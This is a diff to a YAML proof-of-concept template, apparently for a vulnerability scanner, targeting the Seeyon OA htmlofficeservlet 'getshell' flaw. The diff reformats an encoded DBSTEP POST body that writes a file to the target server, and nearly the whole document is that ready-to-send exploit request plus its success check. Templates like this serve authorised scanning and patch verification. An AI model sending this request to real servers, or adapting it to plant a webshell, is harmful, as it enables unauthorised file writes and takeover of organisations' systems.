@@ -1,28 +1,9 @@
+name: poc-yaml-seeyon-htmlofficeservlet-getshell
 rules:
   - method: POST
     path: /seeyon/htmlofficeservlet
-    body: >-
-      DBSTEP V3.0     355             0               22            DBSTEP=OKMLlKlV
-      
-      OPTION=S3WYOSWLBSGr
-      
-      currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
-      
-      CREATEDATE=wUghPB3szB3Xwg66
-      
-      RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
-      
-      originalFileId=wV66
-      
-      originalCreateDate=wUghPB3szB3Xwg66
-      
-      FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4euwLSGz7T3brV6
-      
-      needReadFile=yRWZdAS6
-      
-      originalCreateDate=wLSGP4oEzLKAz4=iz=66 
-      
-      this is a test for me.f82abdd62cce9d2841a6efd5663e7bee
+    body: 
+      "DBSTEP V3.0     355             0               22            \r\nDBSTEP=OKMLlKlV\r\nOPTION=S3WYOSWLBSGr\r\ncurrentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\nCREATEDATE=wUghPB3szB3Xwg66\r\nRECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\noriginalFileId=wV66\r\noriginalCreateDate=wUghPB3szB3Xwg66\r\nFILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4euwLSGz7T3brV6\r\nneedReadFile=yRWZdAS6\r\noriginalCreateDate=wLSGP4oEzLKAz4=iz=66 \r\nthis is a test for me.f82abdd62cce9d2841a6efd5663e7bee"
     follow_redirects: false
     expression: |
       status==200 && body.bcontains(b'DBSTEP V3.0')
@@ -35,4 +16,5 @@ detail:
   author: orleven
   vulnpath: /seeyon/htmlofficeservlet
   testfile: /seeyon/test681554.txt
-  links: https://github.com/orleven/Tentacle/blob/master/script/seeyon/htmlofficeservlet_getshell.py
+  links: 
+    - https://github.com/orleven/Tentacle/blob/master/script/seeyon/htmlofficeservlet_getshell.py
